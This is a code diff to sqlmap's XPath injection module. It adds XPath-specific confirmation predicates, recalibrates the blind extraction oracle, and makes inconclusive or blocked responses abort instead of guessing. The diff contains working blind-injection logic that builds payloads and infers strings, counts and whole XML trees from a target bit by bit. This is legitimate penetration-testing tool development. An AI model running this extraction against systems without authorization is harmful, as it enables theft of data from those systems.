@@ -5,7 +5,6 @@ Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
-import difflib
 import re
 import time
 
@@ -18,6 +17,14 @@ from lib.core.data import conf
 from lib.core.data import logger
 from lib.core.enums import CUSTOM_LOGGING
 from lib.core.enums import PLACE
+from lib.utils.nonsql import INCONCLUSIVE_MARK
+from lib.utils.nonsql import userDecision
+from lib.utils.nonsql import InconclusiveError
+from lib.utils.nonsql import resolveBit
+from lib.utils.nonsql import sqlErrorPresent
+from lib.utils.nonsql import blockedStatus
+from lib.utils.nonsql import ratio as _ratio
+from lib.utils.nonsql import userOracleActive
 from lib.core.settings import UPPER_RATIO_BOUND
 from lib.core.settings import XPATH_CHAR_MAX
 from lib.core.settings import XPATH_CHAR_MIN
@@ -30,6 +37,7 @@ from lib.utils.xrange import xrange
 
 
 SENTINEL = randomStr(length=10, lowercase=True)
+
 
 XPATH_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)
 
@@ -86,8 +94,6 @@ Slot = namedtuple("Slot", ("place", "parameter", "backend", "oracle", "template"
 Slot.__new__.__defaults__ = (None, None, None, None, None, None, None)
 
 
-def _ratio(first, second):
-    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()
 
 
 def _delim(place):
@@ -145,17 +151,29 @@ def _send(place, parameter, value):
         kwargs = {"raise404": False, "silent": True}
         if conf.verbose >= 3:
             logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
-        page, _, _ = Request.getPage(**kwargs)
+        page, _, code = Request.getPage(**kwargs)
+        # A transport failure or a BLOCKED/ERROR status (5xx, 403/429 WAF/rate-limit) is NOT a usable
+        # oracle sample: returning "" for it would let a one-sided failure fake a true/false divergence
+        # (an empty body cannot be told apart from a dead connection). Signal it as None -> the boolean
+        # routines and the extraction oracle already reject None, so it can never decide a bit.
+        if blockedStatus(code):
+            return None
         return page or ""
     except Exception as ex:
         logger.debug("XPath probe request failed: %s" % getUnicode(ex))
-        return ""
+        return None
     finally:
         conf.parameters[place] = old_params
 
 
 def _isError(page):
-    return bool(re.search(XPATH_ERROR_REGEX, getUnicode(page or "")))
+    # an XPath parser error OR a recognized SQL/DBMS error marks a response as NOT a valid boolean
+    # template. The SQL/DBMS guard (reusing sqlmap's errors.xml via htmlParser + the generic
+    # `SQL (warning|error|syntax)` marker) is essential: a break-out like `*` or `') or ...` trips a
+    # DBMS syntax error on a SQL-injectable parameter, and that error page merely differs from a
+    # normal page - which would otherwise fake a boolean oracle and misreport SQLi as XPath.
+    page = getUnicode(page or "")
+    return bool(re.search(XPATH_ERROR_REGEX, page)) or sqlErrorPresent(page)
 
 
 def _backendFromError(page):
@@ -163,7 +181,9 @@ def _backendFromError(page):
     for backend, regex in XPATH_ERROR_SIGNATURES:
         if re.search(regex, page):
             return backend
-    return "Generic XPath" if _isError(page) else None
+    # ONLY an actual XPath parser error names a (generic) XPath back-end - never a SQL/DBMS error
+    # (which _isError also flags now, but must not be attributed to XPath here)
+    return "Generic XPath" if re.search(XPATH_ERROR_REGEX, page) else None
 
 
 def _probeBackendByParserError(place, parameter):
@@ -207,6 +227,10 @@ def _boolean(truthy, falsy):
     if _ratio(falsePage, falsePage2) < UPPER_RATIO_BOUND:
         return None
 
+    # honor an explicit user oracle (--string/--not-string/--regexp) over raw similarity
+    if userOracleActive():
+        return truePage if (userDecision(truePage) is True and userDecision(falsePage) is False) else None
+
     if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
         return truePage
 
@@ -218,6 +242,32 @@ def _makePayload(original, boundary, predicate):
     if boundary.suffix:
         return "%s%s%s%s" % (original, boundary.prefix, predicate, boundary.suffix)
     return "%s%s%s" % (original, boundary.prefix, predicate)
+
+
+# XPath 1.0-only boolean predicates: each pair differs ONLY in the XPath construct and flips
+# true/false on a real XPath engine, while a SQL back-end errors on all of them (no divergence).
+# A battery (not one primitive) survives an injection context that rejects any single function.
+# DELIBERATELY EXCLUDED after live testing: substring() (MySQL also has it -> would false-positive)
+# and anything using '/*' (a SQL comment opener). Validated SQL-safe on the karlobag MySQL junkyard.
+_XPATH_PREDICATES = (
+    ("string-length('ab')=2",     "string-length('ab')=3"),
+    ("normalize-space(' a ')='a'", "normalize-space(' a ')='z'"),
+    ("translate('ab','a','x')='xb'", "translate('ab','a','x')='zz'"),
+)
+
+
+def _xpathConfirm(place, parameter, original, boundary):
+    """Confirm the injection context actually evaluates XPath, not SQL. The `' or '1'='1` break-out
+    family is IDENTICAL to classic SQL injection, so without a positive XPath-only proof a SQL-
+    injectable parameter would false-positive as XPath. Try the whole battery (wrapped in the SAME
+    verified boundary); ANY member that flips true/false proves an XPath parser."""
+    for truePred, falsePred in _XPATH_PREDICATES:
+        truePayload = _makePayload(original, boundary, truePred)
+        falsePayload = _makePayload(original, boundary, falsePred)
+        if _boolean(lambda p=truePayload: _send(place, parameter, p),
+                    lambda p=falsePayload: _send(place, parameter, p)) is not None:
+            return True
+    return False
 
 
 def _detectBoolean(place, parameter):
@@ -237,15 +287,16 @@ def _detectBoolean(place, parameter):
                             lambda p=falseSpecific: _send(place, parameter, p))
         if template:
             boundary = _BREAKOUT_BOUNDARY.get(breakout)
+            # an extractable (boundary-carrying) break-out shares its syntax with SQL injection;
+            # require an XPath-specific confirm before accepting it, else keep looking
+            if boundary and not _xpathConfirm(place, parameter, original, boundary):
+                continue
             return template, truePayload, boundary
 
-    # Wildcard: only useful for bool differentiation, not enumeration
-    if original:
-        template = _boolean(lambda: _send(place, parameter, "*"),
-                            lambda: _send(place, parameter, SENTINEL))
-        if template:
-            return template, "*", None
-
+    # NOTE: no bare `*`-vs-sentinel wildcard fallback. A wildcard that returns more rows than a random
+    # term is normal search behavior, not proof of an XPath query-boundary escape, and it carries no
+    # boundary to confirm XPath (vs SQL) or to drive extraction. Detection rests only on an XPath-
+    # confirmed boolean break-out (above).
     return None, None, None
 
 
@@ -274,6 +325,15 @@ def _xpathQuote(s):
         return '"%s"' % s
     # both quote types present: use concat() with " as outer delimiter
     return "concat(%s)" % ", '\"', ".join('"%s"' % part for part in s.split('"'))
+
+
+def _extractionBase(original, boundary):
+    """The base value the EXTRACTION payloads use (and therefore the base the oracle must be
+    calibrated with). An OR-style boundary is always-true whenever the original branch matches, so
+    extraction replaces the base with a non-matching SENTINEL; an AND-style boundary needs the
+    original branch to match, so it keeps the original. Calibrating with a different base than
+    extraction uses was the reviewer's core defect."""
+    return SENTINEL if " or " in (boundary.prefix or "") else (original or "x")
 
 
 class _XPathPayloadBuilder(object):
@@ -323,38 +383,60 @@ class _XPathPayloadBuilder(object):
         return self._make("string-length(substring-before(%s,substring(%s,%d,1)))>=%d" % (_CS_LITERAL, target, pos, n))
 
 
-def _makeOracle(place, parameter, template):
-    """Build an oracle from a verified true template. extract(payload) returns
-    True when the response is closer to the true template than to the false page."""
+def _makeOracle(place, parameter, boundary, base):
+    """Build an extraction oracle by RECALIBRATING true/false models from the FINAL extraction base +
+    boundary - the SAME base the _XPathPayloadBuilder uses for every later predicate (SENTINEL for an
+    OR-style boundary, the original value for an AND-style one). Calibrating with the original value
+    while extraction ran with SENTINEL made the models mismatch the actual probes. Send the boundary's
+    own `true()` / `false()` predicates on that base, reproduce each, require them SEPARABLE; else
+    return None so extraction is disabled rather than emitting fabricated data."""
 
     cache = {}
 
     def request(payload):
+        # Cache ONLY usable responses. A transient failure (timeout / 429 / intermittent 5xx / reset)
+        # must never be cached as if it were the answer - it would freeze a wrong bit for every later
+        # bisection step. An unusable response is re-sent on the next call instead.
         if payload not in cache:
-            cache[payload] = _send(place, parameter, payload)
+            page = _send(place, parameter, payload)
+            if page is not None and not _isError(page):
+                cache[payload] = page
+            return page
         return cache[payload]
 
-    falsePage = request(SENTINEL)
+    truePayload = _makePayload(base, boundary, "true()")
+    falsePayload = _makePayload(base, boundary, "false()")
+    trueModel = request(truePayload)
+    falseModel = request(falsePayload)
 
-    def oracle(payload):
-        page = request(payload)
-        if page is None or _isError(page):
-            return False
-        return _ratio(template, page) >= UPPER_RATIO_BOUND
+    # both models must be present, non-error, independently reproducible, and separable
+    if trueModel is None or falseModel is None or _isError(trueModel) or _isError(falseModel):
+        return None
+    if _ratio(trueModel, _send(place, parameter, truePayload)) < UPPER_RATIO_BOUND:
+        return None
+    if _ratio(falseModel, _send(place, parameter, falsePayload)) < UPPER_RATIO_BOUND:
+        return None
+    if _ratio(trueModel, falseModel) >= UPPER_RATIO_BOUND:      # indistinguishable -> can't extract
+        return None
 
     def extract(payload):
+        # A transport failure / blocked / error response is UNKNOWN, not False: route even a missing
+        # initial sample through resolveBit(), which re-sends and ultimately raises InconclusiveError
+        # (so the value aborts) rather than pre-deciding a False bit that corrupts the bisection.
         page = request(payload)
-        if page is None or _isError(page):
-            return False
-        trueRatio = _ratio(template, page)
-        falseRatio = _ratio(falsePage, page)
-        # Require either an unambiguous match against the template or a
-        # clear separation from the false page (minimum 5 %pt margin)
-        return trueRatio >= UPPER_RATIO_BOUND or (trueRatio - falseRatio) > 0.05
+        usable = page if (page is not None and not _isError(page)) else None
+
+        def fresh():
+            p = _send(place, parameter, payload)
+            return None if (p is None or _isError(p)) else p
+        return resolveBit(usable, trueModel, falseModel, fresh)
+
+    def oracle(payload):
+        return extract(payload)
 
     oracle.extract = extract
-    oracle.template = template
-    oracle.falsePage = falsePage
+    oracle.template = trueModel
+    oracle.falsePage = falseModel
     oracle.cache = cache
     return oracle
 
@@ -387,43 +469,57 @@ def _inferValue(oracle, builder, path, getter, maxLen=XPATH_MAX_LENGTH):
     value = ""
     probes = 0
 
-    for _ in xrange(maxLen):
-        found = False
+    try:
+        for _ in xrange(maxLen):
+            found = False
 
-        for cp in _CHARSET:
-            candidate = value + chr(cp)
-            probes += 1
+            for cp in _CHARSET:
+                candidate = value + chr(cp)
+                probes += 1
 
-            if oracle.extract(getter(builder, path, candidate)):
-                value = candidate
-                found = True
+                if oracle.extract(getter(builder, path, candidate)):
+                    value = candidate
+                    found = True
+                    break
+
+            if not found:
                 break
 
-        if not found:
-            break
-
-        if value.endswith("   "):
-            value = value.rstrip()
-            break
+            if value.endswith("   "):
+                value = value.rstrip()
+                break
+    except InconclusiveError:
+        # the oracle stayed ambiguous after retries -> ABORT this value rather than silently
+        # truncate it with a wrong bit (returning None marks it unavailable, not fabricated)
+        logger.warning("XPath extraction aborted for a value (oracle inconclusive after retries)")
+        return None
 
     logger.debug("XPath blind inference: %d probes (length=%d)" % (probes, len(value)))
     return value if value else None
 
 
 def _inferCount(oracle, builder, path, countFn, maxCount=128):
-    """Binary search for a count value using predicate 'count(...)>=N'."""
+    """Binary search for a count value using predicate 'count(...)>=N'. Returns the count, or None
+    when the oracle is inconclusive - NEVER 0, because a real 0 means 'this element is a leaf' and the
+    tree walker would then fabricate scalar text for a node whose child count is actually UNKNOWN."""
 
-    if not oracle.extract(countFn(builder, path, 1)):
-        return 0
+    try:
+        if not oracle.extract(countFn(builder, path, 1)):
+            return 0
 
-    lo, hi = 1, maxCount
-    while lo < hi:
-        mid = (lo + hi + 1) // 2
-        if oracle.extract(countFn(builder, path, mid)):
-            lo = mid
-        else:
-            hi = mid - 1
-    return lo
+        lo, hi = 1, maxCount
+        while lo < hi:
+            mid = (lo + hi + 1) // 2
+            if oracle.extract(countFn(builder, path, mid)):
+                lo = mid
+            else:
+                hi = mid - 1
+        return lo
+    except InconclusiveError:
+        # unknown must NOT collapse to 0 (that reads as a leaf); signal it so the walker marks the
+        # node partial instead of inventing a structurally-plausible but wrong empty/leaf element
+        logger.warning("XPath count inference inconclusive (oracle ambiguous after retries)")
+        return None
 
 
 def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH):
@@ -436,36 +532,41 @@ def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH):
     lot when walking a whole document tree. Characters outside the charset are
     surfaced as '?' so the rest of the value is still recovered."""
 
-    if not oracle.extract(builder.stringLengthAtLeast(target, 1)):
-        return None
+    try:
+        if not oracle.extract(builder.stringLengthAtLeast(target, 1)):
+            return None
 
-    lo, hi = 1, maxLen
-    while lo < hi:
-        mid = (lo + hi + 1) // 2
-        if oracle.extract(builder.stringLengthAtLeast(target, mid)):
-            lo = mid
-        else:
-            hi = mid - 1
-    length = lo
-
-    chars = []
-    probes = 0
-    last = len(_CS_ORDS) - 1
-    for pos in xrange(1, length + 1):
-        probes += 1
-        if not oracle.extract(builder.charPresent(target, pos)):
-            chars.append("?")
-            continue
-
-        clo, chi = 0, last
-        while clo < chi:
-            cmid = (clo + chi + 1) // 2
-            probes += 1
-            if oracle.extract(builder.charIndexAtLeast(target, pos, cmid)):
-                clo = cmid
+        lo, hi = 1, maxLen
+        while lo < hi:
+            mid = (lo + hi + 1) // 2
+            if oracle.extract(builder.stringLengthAtLeast(target, mid)):
+                lo = mid
             else:
-                chi = cmid - 1
-        chars.append(chr(_CS_ORDS[clo]))
+                hi = mid - 1
+        length = lo
+
+        chars = []
+        probes = 0
+        last = len(_CS_ORDS) - 1
+        for pos in xrange(1, length + 1):
+            probes += 1
+            if not oracle.extract(builder.charPresent(target, pos)):
+                chars.append("?")
+                continue
+
+            clo, chi = 0, last
+            while clo < chi:
+                cmid = (clo + chi + 1) // 2
+                probes += 1
+                if oracle.extract(builder.charIndexAtLeast(target, pos, cmid)):
+                    clo = cmid
+                else:
+                    chi = cmid - 1
+            chars.append(chr(_CS_ORDS[clo]))
+    except InconclusiveError:
+        # abort this value rather than emit a length/char chosen from an ambiguous bit
+        logger.warning("XPath string inference aborted (oracle inconclusive after retries)")
+        return None
 
     value = "".join(chars)
     logger.debug("XPath blind inference: %d probes (length=%d)" % (probes, length))
@@ -485,61 +586,84 @@ def _walkTree(oracle, builder, path="/*", depth=0):
 
     logger.info("discovered element: '%s'" % name)
 
+    # None => inconclusive (NOT a real count). An unknown child/attribute count must leave the node
+    # PARTIAL: never treat unknown as a leaf (which would fabricate scalar text) or iterate a phantom
+    # range - only enumerate when the count is a confirmed, positive integer.
     childCount = _inferCount(oracle, builder, path,
                              lambda b, p, c: b.childCount(p, c),
                              maxCount=32)
-    if childCount >= 32:
+    if childCount is None:
+        logger.warning("element '%s' child count is inconclusive; marking node partial" % name)
+    elif childCount >= 32:
         logger.warning("element '%s' hit the 32-child cap; some child nodes may be omitted" % name)
 
     attrCount = _inferCount(oracle, builder, path,
                             lambda b, p, c: b.attributeCount(p, c),
                             maxCount=16)
-    if attrCount >= 16:
+    if attrCount is None:
+        logger.warning("element '%s' attribute count is inconclusive; some attributes may be omitted" % name)
+    elif attrCount >= 16:
         logger.warning("element '%s' hit the 16-attribute cap; some attributes may be omitted" % name)
 
     attributes = []
-    for i in xrange(1, attrCount + 1):
+    for i in xrange(1, (attrCount or 0) + 1):
         attrName = _inferString(oracle, builder, "name(%s/@*[%d])" % (path, i))
         if not attrName:
             continue
 
         attrValue = _inferString(oracle, builder, "string(%s/@*[%d])" % (path, i))
-        attributes.append({"name": attrName, "value": attrValue or ""})
-        logger.info("  attribute: @%s='%s'" % (attrName, attrValue or ""))
+        # None => inconclusive (aborted) attribute value; mark it visibly, don't blank it into ""
+        shown = INCONCLUSIVE_MARK if attrValue is None else attrValue
+        attributes.append({"name": attrName, "value": shown})
+        logger.info("  attribute: @%s='%s'" % (attrName, shown))
 
+    # only a CONFIRMED zero child count means "leaf" -> infer its scalar text; an unknown (None) count
+    # must not be read as a leaf
     text = None
     if childCount == 0:
         text = _inferString(oracle, builder, "string(%s)" % path)
 
     children = []
-    for i in xrange(1, childCount + 1):
+    for i in xrange(1, (childCount or 0) + 1):
         childPath = "%s/*[%d]" % (path, i)
         child = _walkTree(oracle, builder, childPath, depth + 1)
         if child:
             children.append(child)
 
+    # PARTIAL when a count is unknown (None) OR a cap was hit (>=32 children / >=16 attributes) - a
+    # truncated node is not a complete one
+    partial = (childCount is None or attrCount is None
+               or (childCount is not None and childCount >= 32)
+               or (attrCount is not None and attrCount >= 16))
     return {
         "name": name,
         "path": path,
         "children": children,
         "attributes": attributes,
         "text": text,
+        "partial": partial,
     }
 
 
 def _treeToTable(node):
-    """Flatten a tree node to (columns, rows) for grid output."""
+    """Flatten a tree node to (columns, rows) for grid output. A node whose child/attribute count was
+    inconclusive is flagged (Element name suffixed with ' [partial]') so the recovered structure is
+    visibly distinguished from a fully-enumerated one."""
 
     columns = ["Path", "Element", "Attribute", "Value"]
     rows = []
 
     def _flatten(n, depth=0):
         path = n["path"]
-        rows.append([path, n["name"], "", ""])
+        partial = n.get("partial")
+        name = n["name"] + (" [partial]" if partial else "")
+        # keep the bare element row when the node is PARTIAL (so a partial node with no recovered
+        # attributes/children/text still appears - it must not be filtered away as if fully empty)
+        rows.append([path, name, "", "[partial - enumeration inconclusive]" if partial else ""])
         for attr in n.get("attributes", []):
-            rows.append([path, n["name"], "@" + attr["name"], attr["value"]])
+            rows.append([path, name, "@" + attr["name"], attr["value"]])
         if n.get("text"):
-            rows.append([path, n["name"], "text()", n["text"]])
+            rows.append([path, name, "text()", n["text"]])
         for child in n.get("children", []):
             _flatten(child, depth + 1)
 
@@ -605,15 +729,23 @@ def xpathScan():
             template, payload, boundary = _detectBoolean(place, parameter)
             if template:
                 if boundary and boundary.extractable:
-                    found += 1
                     backend = backendHint or "Generic XPath"
-                    logger.info("%s parameter '%s' is vulnerable to XPath injection (back-end: '%s')" % (place, parameter, backend))
+                    original = _originalValue(place, parameter) or ""
+                    oracle = _makeOracle(place, parameter, boundary, _extractionBase(original, boundary))
+                    found += 1
                     if conf.beep:
                         beep()
-
-                    oracle = _makeOracle(place, parameter, template)
+                    if oracle is None:
+                        # detection is confirmed, but the extraction true/false models are not
+                        # reliably separable - report the finding WITHOUT extracting (never emit
+                        # fabricated tree data from an unstable oracle)
+                        logger.info("%s parameter '%s' is vulnerable to XPath injection (back-end: '%s'); "
+                                    "extraction disabled (true/false models not reliably separable)" % (place, parameter, backend))
+                        conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: XPath injection\n    Title: XPath boolean-based blind (extraction unavailable)\n    Payload: %s\n---" % (parameter, place, payload))
+                        continue
+                    logger.info("%s parameter '%s' is vulnerable to XPath injection (back-end: '%s')" % (place, parameter, backend))
                     slots.append(Slot(place=place, parameter=parameter, backend=backend,
-                                      oracle=oracle, template=template, payload=payload,
+                                      oracle=oracle, template=oracle.template, payload=payload,
                                       boundary=boundary))
                     continue
 
@@ -653,13 +785,8 @@ def xpathScan():
         return
 
     original = _originalValue(slot.place, slot.parameter) or "x"
-    # OR-style boundaries always-true if the original branch matches, so use a
-    # sentinel that is guaranteed not to appear as a field value.  AND-style
-    # boundaries need the original branch to match; keep the original there.
-    if " or " in slot.boundary.prefix:
-        base = SENTINEL
-    else:
-        base = original
+    # SAME base the oracle was calibrated with (see _extractionBase / _makeOracle)
+    base = _extractionBase(original, slot.boundary)
     builder = _XPathPayloadBuilder(base, slot.boundary)
     oracle = slot.oracle
 
